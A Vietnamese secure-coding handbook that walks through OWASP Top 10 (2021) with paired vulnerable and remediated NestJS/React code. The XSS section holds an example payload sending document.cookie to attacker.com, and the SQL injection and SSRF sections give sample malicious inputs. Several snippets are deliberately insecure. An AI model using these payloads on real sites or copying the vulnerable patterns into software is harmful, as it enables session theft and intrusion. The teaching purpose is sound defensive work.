# CẨM NANG BẢO MẬT ỨNG DỤNG

### Phân tích OWASP Top 10 qua Minh họa Thực tế với NestJS và React

> **Giới thiệu kỹ thuật:** Tài liệu này cung cấp cái nhìn chi tiết về các lỗ hổng bảo mật phổ biến nhất theo danh mục OWASP Top 10 (2021). Mỗi lỗ hổng được phân tích toàn diện bao gồm: cơ chế khai thác, lỗ hổng mã nguồn thực tế trong hệ sinh thái full-stack (Backend: NestJS / TypeORM, Frontend: React), và giải pháp khắc phục triệt để theo chuẩn production.
>
> Bản markdown này đã được **bổ sung thêm 4 hạng mục còn thiếu** trong tài liệu gốc (A02, A06, A08, A09) để đầy đủ toàn bộ OWASP Top 10, kèm ví dụ code tương tự phong cách NestJS/React.

---

## Mục lục

1. [A01 - Broken Access Control](#a012021---kiểm-soát-truy-cập-bị-phá-vỡ-broken-access-control)
2. [A02 - Cryptographic Failures](#a022021---lỗi-mật-mã-cryptographic-failures) _(bổ sung)_
3. [A03 - Injection & XSS](#a032021---lỗi-tiêm-mã-injection--xss)
4. [A04 - Insecure Design](#a042021---thiết-kế-không-an-toàn-insecure-design)
5. [A05 - Security Misconfiguration](#a052021---cấu-hình-sai-sót-bảo-mật-security-misconfiguration)
6. [A06 - Vulnerable and Outdated Components](#a062021---thành-phần-dễ-tổn-thương-và-lỗi-thời-vulnerable-and-outdated-components) _(bổ sung)_
7. [A07 - Identification and Authentication Failures](#a072021---sai-sót-xác-thực-và-định-danh)
8. [A08 - Software and Data Integrity Failures](#a082021---lỗi-toàn-vẹn-phần-mềm-và-dữ-liệu-software-and-data-integrity-failures) _(bổ sung)_
9. [A09 - Security Logging and Monitoring Failures](#a092021---lỗi-ghi-log-và-giám-sát-bảo-mật-security-logging-and-monitoring-failures) _(bổ sung)_
10. [A10 - Server-Side Request Forgery (SSRF)](#a102021---giả-mạo-yêu-cầu-từ-phía-máy-chủ-ssrf)

---

## A01:2021 - Kiểm Soát Truy Cập Bị Phá Vỡ (Broken Access Control)

**Cơ chế khai thác:** Kẻ tấn công vượt qua các cơ chế kiểm tra quyền hạn để truy cập trái phép vào tài nguyên của người dùng khác (IDOR) hoặc thực hiện các chức năng của quản trị viên (Privilege Escalation). Ví dụ, thay đổi ID trong URL hoặc payload gửi lên API mà hệ thống backend không đối chiếu với Session/JWT của người dùng hiện tại.

### 1. Backend (NestJS) - Lỗ hổng IDOR

Dưới đây là mã nguồn endpoint lấy thông tin đơn hàng bị lỗi IDOR do tin tưởng hoàn toàn vào tham số `id` do client gửi lên mà không kiểm tra quyền sở hữu.

**❌ Vulnerable NestJS Controller**

```typescript
@Get(':id')
async getOrder(@Param('id') id: string, @Req() req: any) {
  // LỖ HỔNG: Chỉ tìm kiếm theo ID đơn hàng mà không xác minh đơn hàng đó
  // có thuộc về req.user.id hay không
  return this.orderService.findById(id);
}
```

**✅ Remediated NestJS với Guard và Check Quyền Sở Hữu**

```typescript
@Get(':id')
@UseGuards(JwtAuthGuard)
async getOrder(@Param('id') id: string, @Req() req: any) {
  const order = await this.orderService.findById(id);
  if (!order) throw new NotFoundException('Order not found');

  // KHẮC PHỤC: Xác thực quyền sở hữu tài nguyên dữ liệu trước khi trả về
  if (order.userId !== req.user.id && req.user.role !== Role.ADMIN) {
    throw new ForbiddenException('Bạn không có quyền truy cập đơn hàng này');
  }
  return order;
}
```

> 💡 **Mở rộng:** Ngoài IDOR, nhóm này còn bao gồm việc thiếu kiểm tra quyền theo phương thức HTTP (ví dụ chặn `GET` nhưng quên chặn `DELETE`/`PUT`), CORS misconfiguration cho phép đọc dữ liệu nhạy cảm, và force browsing (truy cập trực tiếp URL admin mà không qua kiểm tra role). Nên áp dụng nguyên tắc **deny by default** — mặc định từ chối truy cập, chỉ cấp quyền tường minh (whitelist), thay vì mặc định cho phép rồi mới chặn từng trường hợp.

---

## A02:2021 - Lỗi Mật Mã (Cryptographic Failures)

_(Mục bổ sung — trước đây gọi là "Sensitive Data Exposure")_

**Cơ chế khai thác:** Xảy ra khi dữ liệu nhạy cảm (mật khẩu, số thẻ, thông tin cá nhân) không được mã hóa đúng cách khi lưu trữ (at rest) hoặc truyền tải (in transit), hoặc sử dụng thuật toán băm/mã hóa yếu (MD5, SHA1 cho mật khẩu, không có salt). Kẻ tấn công có thể đọc trộm dữ liệu qua man-in-the-middle hoặc crack hash offline sau khi database bị rò rỉ.

### 1. Backend (NestJS) - Băm mật khẩu yếu

**❌ Vulnerable: Lưu mật khẩu bằng hash yếu, không salt**

```typescript
import * as crypto from 'crypto';

async createUser(dto: CreateUserDto) {
  // LỖ HỔNG: MD5 là thuật toán đã bị phá vỡ, không có salt,
  // dễ dàng bị crack bằng rainbow table
  const hashedPassword = crypto.createHash('md5').update(dto.password).digest('hex');
  return this.userRepository.save({ ...dto, password: hashedPassword });
}
```

**✅ Remediated: Sử dụng bcrypt/argon2 với salt tự động**

```typescript
import * as bcrypt from 'bcrypt';

async createUser(dto: CreateUserDto) {
  // KHẮC PHỤC: bcrypt tự sinh salt ngẫu nhiên cho từng user,
  // cost factor (saltRounds) làm chậm brute-force
  const saltRounds = 12;
  const hashedPassword = await bcrypt.hash(dto.password, saltRounds);
  return this.userRepository.save({ ...dto, password: hashedPassword });
}

async validatePassword(plain: string, hashed: string): Promise<boolean> {
  return bcrypt.compare(plain, hashed);
}
```

> 💡 **Mở rộng:** Các điểm cần kiểm tra thêm:
>
> - **Luôn dùng HTTPS/TLS** cho toàn bộ traffic, kể cả nội bộ giữa các service.
> - Không hard-code khóa mã hóa (encryption key) trong source code — dùng biến môi trường hoặc secret manager (AWS KMS, HashiCorp Vault).
> - Không lưu dữ liệu nhạy cảm (CCCD, số thẻ ngân hàng) ở dạng plaintext nếu không thực sự cần thiết; áp dụng mã hóa cột (column-level encryption) khi cần.
> - Với JWT, tránh nhúng thông tin nhạy cảm (mật khẩu, số điện thoại) vào payload vì JWT chỉ được **ký (sign)** chứ không **mã hóa (encrypt)** theo mặc định — ai cũng decode được phần payload.

---

## A03:2021 - Lỗi Tiêm Mã (Injection) & XSS

**Cơ chế khai thác:** Xảy ra khi dữ liệu không đáng tin cậy được gửi đến trình thông dịch dưới dạng một phần của lệnh hoặc truy vấn (SQL Injection, NoSQL Injection, XSS). Kẻ tấn công chèn các ký tự đặc biệt để thay đổi cấu trúc truy vấn nguyên bản nhằm đọc/ghi database trái phép hoặc thực thi script độc hại trên trình duyệt người dùng.

### 1. Backend (NestJS + TypeORM) - SQL Injection

Sử dụng nối chuỗi thô trong truy vấn SQL thay vì tận dụng cơ chế Parameterized Query của ORM.

**❌ Vulnerable Raw Query Injection**

```typescript
@Get('search')
async searchProducts(@Query('name') name: string) {
  // LỖ HỔNG: Nối chuỗi trực tiếp đầu vào từ user vào câu lệnh SQL thô
  return this.productRepository.query(
    `SELECT * FROM product WHERE name = '${name}'`
  );
}
// Kẻ tấn công truyền: name = "' OR '1'='1" -> Lấy toàn bộ sản phẩm
```

**✅ Remediated Parameterized Query**

```typescript
@Get('search')
async searchProducts(@Query('name') name: string) {
  // KHẮC PHỤC: Sử dụng QueryBuilder hoặc tham số hóa ràng buộc bảo mật (Data Binding)
  return this.productRepository
    .createQueryBuilder('product')
    .where('product.name = :name', { name })
    .getMany();
}
```

### 2. Frontend (React) - Cross-Site Scripting (XSS)

Mặc dù React tự động mã hóa chuỗi để chống XSS, việc lạm dụng thuộc tính render thô sẽ phá vỡ lớp bảo vệ này.

**❌ Vulnerable React Render HTML Thô**

```jsx
function ProductReview({ comment }) {
  // LỖ HỔNG: dangerouslySetInnerHTML cho phép thực thi mã JavaScript độc hại từ dữ liệu user
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
// Payload khai thác: <img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)"/>
```

**✅ Remediated React Tự Động Escape & Khử Khuẩn**

```jsx
import dompurify from "dompurify";

function ProductReview({ comment }) {
  // KHẮC PHỤC 1: Render dạng Text chuẩn nếu không cần định dạng HTML
  // return <div>{comment}</div>;

  // KHẮC PHỤC 2: Nếu bắt buộc nhận HTML, dùng DOMPurify để loại bỏ script độc hại
  const cleanHtml = dompurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

> 💡 **Mở rộng:** Trong hệ sinh thái TypeORM, ngoài raw query còn cần cẩn trọng với `find({ where: ... })` khi nhận object trực tiếp từ query string (có thể dẫn tới NoSQL-style injection với các operator như `$gt`, `$ne` nếu dùng MongoDB). Với NestJS nên dùng `class-validator` + `ValidationPipe` (`whitelist: true`, `forbidNonWhitelisted: true`) để lọc bỏ field lạ ngay ở tầng DTO trước khi chạm tới service.

---

## A04:2021 - Thiết Kế Không An Toàn (Insecure Design)

**Cơ chế khai thác:** Đây là các lỗi thuộc về kiến trúc hệ thống và quy trình logic nghiệp vụ ngay từ khâu thiết kế (không phải do cài đặt code sai). Ví dụ: Hệ thống lấy lại mật khẩu không có cơ chế giới hạn tần suất thử (Rate Limiting), cho phép kẻ tấn công vét cạn (Brute Force) OTP.

### 1. Backend (NestJS) - Thiết kế thiếu Rate Limiting

Dưới đây là giải pháp tích hợp tầng phòng thủ giới hạn tần suất gọi API để bảo vệ tài nguyên hệ thống.

**✅ Remediated Cấu hình Throttler trong NestJS**

```typescript
import { ThrottlerModule, ThrottlerGuard } from "@nestjs/throttler";
import { Module } from "@nestjs/common";
import { APP_GUARD } from "@nestjs/core";

@Module({
  imports: [
    ThrottlerModule.forRoot([
      {
        ttl: 60000, // 1 phút
        limit: 5, // Tối đa 5 request với các API nhạy cảm như Login/OTP
      },
    ]),
  ],
  providers: [
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
  ],
})
export class AppModule {}
```

> 💡 **Mở rộng:** Insecure design còn bao gồm: thiếu threat modeling ngay từ giai đoạn phân tích yêu cầu, business logic flaw (ví dụ cho phép áp dụng mã giảm giá nhiều lần do thiếu ràng buộc "one-time use" ở tầng database), và thiếu các "security tier" phân theo mức độ nhạy cảm dữ liệu. Khắc phục gốc rễ đòi hỏi thay đổi cách thiết kế (ví dụ thêm cột `used_at` cho voucher, thêm transaction/lock khi trừ tồn kho), không chỉ vá lỗi code.

---

## A05:2021 - Cấu Hình Sai Sót Bảo Mật (Security Misconfiguration)

**Cơ chế khai thác:** Xảy ra khi hệ thống bật các tính năng debug mặc định, cấu hình CORS quá lỏng lẻo (`Access-Control-Allow-Origin: *` kèm `credentials`), hoặc để lộ các thông tin lỗi chi tiết (Stack Trace) ra môi trường Production giúp hacker thu thập thông tin hạ tầng.

### 1. Backend (NestJS) - Cấu hình CORS và Lộ thông tin Stack Trace

**❌ Vulnerable Mở CORS Vô Điều Kiện trong main.ts**

```typescript
const app = await NestFactory.create(AppModule);
// LỖ HỔNG: Cho phép mọi domain bên thứ ba đọc dữ liệu thông qua trình duyệt
app.enableCors({ origin: true, credentials: true });
```

**✅ Remediated Khóa CORS nghiêm ngặt & Ẩn Exception Details**

```typescript
// 1. Khóa CORS chặt chẽ theo Whitelist cấu hình từ ENV
app.enableCors({
  origin: process.env.ALLOWED_ORIGINS.split(","),
  credentials: true,
});

// 2. Định nghĩa Toàn cục HttpExceptionFilter để ẩn Stack Trace ở Production
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(exception: unknown, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse();
    const isProd = process.env.NODE_ENV === "production";

    response.status(500).json({
      statusCode: 500,
      message: "Internal server error",
      // KHẮC PHỤC: Không bao giờ trả về exception.stack cho client ở môi trường production
      error: isProd ? null : (exception as any).message,
    });
  }
}
```

> 💡 **Mở rộng:** Ngoài CORS và stack trace, cần rà soát thêm: HTTP security headers (dùng middleware `helmet()` trong NestJS để set `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`...), tắt Swagger/API docs công khai ở production hoặc bảo vệ bằng auth, xóa các tài khoản/mật khẩu mặc định của database và admin panel, và đảm bảo các thư mục `.env`, `.git` không bị expose qua web server.

---

## A06:2021 - Thành Phần Dễ Tổn Thương và Lỗi Thời (Vulnerable and Outdated Components)

_(Mục bổ sung)_

**Cơ chế khai thác:** Xảy ra khi ứng dụng sử dụng các thư viện, framework, hoặc runtime (npm packages, NestJS/React version, Node.js) đã lỗi thời và có lỗ hổng bảo mật đã được công bố (CVE) công khai. Kẻ tấn công chỉ cần quét fingerprint phiên bản rồi áp dụng exploit có sẵn, không cần tự tìm lỗ hổng mới.

### 1. Ví dụ thực tế - package.json không được kiểm soát

**❌ Vulnerable: Không kiểm tra, không khóa phiên bản dependency**

```json
{
  "dependencies": {
    "lodash": "^4.17.4",
    "axios": "*"
  }
}
```

Phiên bản `lodash@4.17.4` từng tồn tại lỗ hổng prototype pollution (CVE-2019-10744); ký hiệu `*` cho axios khiến build có thể tự động kéo về phiên bản mới có breaking change hoặc lỗ hổng chưa được kiểm chứng.

**✅ Remediated: Khóa version, kiểm tra định kỳ, dùng lockfile**

```bash
# Khóa version chính xác trong package.json, dùng package-lock.json / yarn.lock
npm audit                 # Quét lỗ hổng đã biết trong dependency tree
npm audit fix             # Tự động vá các lỗ hổng có bản patch tương thích

# Tích hợp vào CI/CD pipeline để chặn build khi phát hiện lỗ hổng mức cao/nghiêm trọng
npm audit --audit-level=high
```

```typescript
// Ví dụ dùng Dependabot / Renovate Bot để tự động tạo PR cập nhật
// .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
```

> 💡 **Mở rộng:** Với dự án NestJS/React, nên: (1) chạy `npm audit` hoặc dùng Snyk/Dependabot trong CI, (2) loại bỏ các dependency không còn sử dụng (`depcheck`), (3) theo dõi Node.js LTS và nâng cấp trước khi phiên bản cũ hết hạn hỗ trợ bảo mật (EOL), (4) với các thư viện React UI bên thứ ba xử lý HTML/markdown, kiểm tra xem chúng có tự sinh ra lỗ hổng XSS gián tiếp hay không.

---

## A07:2021 - Sai Sót Xác Thực và Định Danh

**Cơ chế khai thác:** Hệ thống sử dụng thuật toán mã hóa JWT yếu (ví dụ: cho phép thuật toán `none`), không thu hồi JWT cũ khi đăng xuất, hoặc lưu trữ Access Token lỏng lẻo ở phía Frontend khiến token dễ dàng bị đánh cắp qua XSS.

### 1. Frontend (React) - Lưu trữ Token không an toàn

Lưu JWT Token vào `localStorage` là đích nhắm hàng đầu của các cuộc tấn công XSS thành công.

**❌ Vulnerable Lưu trữ Token vào LocalStorage**

```javascript
// LỖ HỔNG: Script độc hại chạy trên trang web có thể truy cập trực tiếp
// câu lệnh này để lấy trộm token
localStorage.setItem("accessToken", token);
```

**✅ Remediated Giải pháp HttpOnly Cookie phối hợp Memory State**

Khắc phục bằng cách yêu cầu Backend trả về Access Token qua biến cục bộ ngắn hạn (State) và Refresh Token thông qua một `HttpOnly`, `Secure`, `SameSite=Strict` Cookie.

**✅ Remediated Cấu hình Cookie phía Backend (NestJS)**

```typescript
@Post('login')
async login(@Res({ passthrough: true }) response: Response) {
  const tokens = await this.authService.issueTokens();

  // KHẮC PHỤC: Trình duyệt tự lưu trữ bảo mật, JS hoàn toàn không thể đọc được cookie này
  response.cookie('refreshToken', tokens.refreshToken, {
    httpOnly: true,
    secure: true,      // Chỉ gửi qua HTTPS
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
  });

  return { accessToken: tokens.accessToken };
}
```

> 💡 **Mở rộng:** Cũng cần: cơ chế thu hồi token (token blacklist/revocation list bằng Redis khi user logout hoặc đổi mật khẩu), giới hạn thời gian sống Access Token ngắn (5-15 phút) kết hợp Refresh Token dài hạn, bắt buộc xác thực đa yếu tố (MFA) cho các tài khoản quản trị, và không cho phép session cố định (session fixation) — luôn tạo session/token mới sau khi đăng nhập thành công.

---

## A08:2021 - Lỗi Toàn Vẹn Phần Mềm và Dữ Liệu (Software and Data Integrity Failures)

_(Mục bổ sung)_

**Cơ chế khai thác:** Xảy ra khi ứng dụng tin tưởng vào code, plugin, hoặc dữ liệu từ nguồn không được xác minh tính toàn vẹn — ví dụ tải script từ CDN bên thứ ba không kiểm tra checksum, deserialize dữ liệu không đáng tin cậy dẫn tới remote code execution, hoặc pipeline CI/CD không kiểm soát cho phép chèn mã độc trước khi deploy.

### 1. Frontend (React) - Tải script CDN không kiểm tra tính toàn vẹn

**❌ Vulnerable: Nhúng script bên thứ ba không có Subresource Integrity (SRI)**

```html
<!-- LỖ HỔNG: Nếu CDN bị compromise, script độc hại sẽ được thực thi
     trực tiếp trên trình duyệt người dùng mà không có cảnh báo -->
<script src="https://cdn.example.com/analytics.js"></script>
```

**✅ Remediated: Thêm Subresource Integrity (SRI) hash**

```html
<!-- KHẮC PHỤC: Trình duyệt sẽ từ chối thực thi script nếu hash không khớp,
     tức là nội dung file đã bị thay đổi so với ban đầu -->
<script
  src="https://cdn.example.com/analytics.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

### 2. Backend (NestJS) - Deserialize dữ liệu không kiểm soát

**❌ Vulnerable: Deserialize JSON/object mà không xác thực schema**

```typescript
@Post('import')
async importConfig(@Body() rawData: any) {
  // LỖ HỔNG: Nhận object bất kỳ và merge/eval trực tiếp vào cấu hình hệ thống
  // có thể bị lợi dụng để ghi đè các thuộc tính nội bộ (prototype pollution)
  Object.assign(this.config, rawData);
}
```

**✅ Remediated: Validate schema chặt chẽ trước khi merge**

```typescript
@Post('import')
async importConfig(@Body() dto: ImportConfigDto) {
  // KHẮC PHỤC: dto đã được whitelist bởi class-validator/ValidationPipe,
  // chỉ những field khai báo tường minh trong DTO mới được chấp nhận
  this.config = { ...this.config, ...dto };
}
```

> 💡 **Mở rộng:** Với CI/CD pipeline, nên: ký (sign) artifact/build trước khi deploy, giới hạn quyền ghi vào registry/package repository, bật audit log cho các thay đổi pipeline, và không cho phép auto-update dependency production mà không qua review. Đây cũng là nhóm liên quan tới các cuộc tấn công chuỗi cung ứng (supply chain attack) nổi bật như SolarWinds hay các package npm bị chèn mã độc.

---

## A09:2021 - Lỗi Ghi Log và Giám Sát Bảo Mật (Security Logging and Monitoring Failures)

_(Mục bổ sung)_

**Cơ chế khai thác:** Xảy ra khi hệ thống không ghi log đầy đủ các sự kiện bảo mật quan trọng (đăng nhập thất bại, thay đổi quyền, truy cập dữ liệu nhạy cảm), hoặc log không được giám sát/cảnh báo real-time, khiến đội vận hành phát hiện sự cố quá muộn — thường sau khi kẻ tấn công đã khai thác thành công trong thời gian dài.

### 1. Backend (NestJS) - Thiếu logging cho sự kiện bảo mật

**❌ Vulnerable: Không log các hành vi đáng ngờ**

```typescript
@Post('login')
async login(@Body() dto: LoginDto) {
  const user = await this.authService.validateUser(dto);
  if (!user) {
    // LỖ HỔNG: Đăng nhập sai không được ghi lại,
    // không thể phát hiện tấn công brute-force hay credential stuffing
    throw new UnauthorizedException('Sai tài khoản hoặc mật khẩu');
  }
  return this.authService.issueTokens(user);
}
```

**✅ Remediated: Ghi log có cấu trúc và cảnh báo bất thường**

```typescript
@Post('login')
async login(@Body() dto: LoginDto, @Req() req: Request) {
  const user = await this.authService.validateUser(dto);

  if (!user) {
    // KHẮC PHỤC: Ghi log có cấu trúc (structured log) kèm IP, timestamp, username
    this.logger.warn({
      event: 'LOGIN_FAILED',
      username: dto.username,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString(),
    });

    // Có thể tích hợp thêm: đếm số lần thất bại liên tiếp trong Redis
    // để kích hoạt cảnh báo/khóa tài khoản tạm thời khi vượt ngưỡng
    await this.securityMonitor.trackFailedLogin(dto.username, req.ip);

    throw new UnauthorizedException('Sai tài khoản hoặc mật khẩu');
  }

  this.logger.log({ event: 'LOGIN_SUCCESS', userId: user.id, ip: req.ip });
  return this.authService.issueTokens(user);
}
```

> 💡 **Mở rộng:** Cần đảm bảo: (1) log không chứa dữ liệu nhạy cảm (mật khẩu, token, số thẻ) ở dạng plaintext, (2) log được lưu tập trung (ELK stack, Datadog, CloudWatch) và có cơ chế chống giả mạo/xóa dấu vết, (3) thiết lập alerting real-time cho các pattern bất thường (nhiều request 403/401 từ cùng một IP trong thời gian ngắn), (4) có quy trình incident response rõ ràng khi phát hiện xâm nhập.

---

## A10:2021 - Giả Mạo Yêu Cầu Từ Phía Máy Chủ (SSRF)

**Cơ chế khai thác:** Xảy ra khi một ứng dụng web thực hiện một yêu cầu HTTP đến một URL do người dùng cung cấp mà không qua kiểm tra kiểm soát. Kẻ tấn công có thể ép máy chủ backend gửi request truy cập vào các dịch vụ nội bộ (như AWS metadata endpoint `169.254.169.254` hoặc database nội bộ mạng LAN).

### 1. Backend (NestJS) - Kiểm tra URL do người dùng truyền vào

**❌ Vulnerable Tải ảnh từ URL bất kỳ**

```typescript
@Post('fetch-avatar')
async fetchAvatar(@Body('url') url: string) {
  // LỖ HỔNG: Kẻ tấn công truyền url = "http://127.0.0.1:5432" để quét port database nội bộ
  const response = await this.httpService.axiosRef.get(url);
  return response.data;
}
```

**✅ Remediated Áp dụng Whitelist Domain định sẵn**

```typescript
@Post('fetch-avatar')
async fetchAvatar(@Body('url') url: string) {
  const parsedUrl = new URL(url);
  const allowedDomains = ['images.unsplash.com', 'res.cloudinary.com'];

  // KHẮC PHỤC: Chỉ cho phép gọi ra ngoài các domain an toàn đã được cấu hình trước
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    throw new BadRequestException('Domain không được phép tải tài nguyên');
  }

  const response = await this.httpService.axiosRef.get(url);
  return response.data;
}
```

> 💡 **Mở rộng:** Ngoài whitelist domain, nên: chặn các dải IP nội bộ (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16, 192.168.0.0/16) kể cả khi domain resolve ra IP nội bộ (DNS rebinding attack), tắt redirect tự động khi gọi HTTP client (`maxRedirects: 0`), và chạy service gọi URL bên ngoài trong network segment riêng biệt (egress firewall) không có quyền truy cập vào hạ tầng nội bộ nhạy cảm.

---

## Bảng tổng hợp OWASP Top 10 (2021)

| #   | Hạng mục                                   | Nguồn tài liệu |
| --- | ------------------------------------------ | -------------- |
| A01 | Broken Access Control                      | Tài liệu gốc   |
| A02 | Cryptographic Failures                     | Bổ sung        |
| A03 | Injection & XSS                            | Tài liệu gốc   |
| A04 | Insecure Design                            | Tài liệu gốc   |
| A05 | Security Misconfiguration                  | Tài liệu gốc   |
| A06 | Vulnerable and Outdated Components         | Bổ sung        |
| A07 | Identification and Authentication Failures | Tài liệu gốc   |
| A08 | Software and Data Integrity Failures       | Bổ sung        |
| A09 | Security Logging and Monitoring Failures   | Bổ sung        |
| A10 | Server-Side Request Forgery (SSRF)         | Tài liệu gốc   |

---

_Tài liệu hướng dẫn thực hành lập trình an toàn dành cho đội ngũ Kỹ sư NestJS & React — 2026_
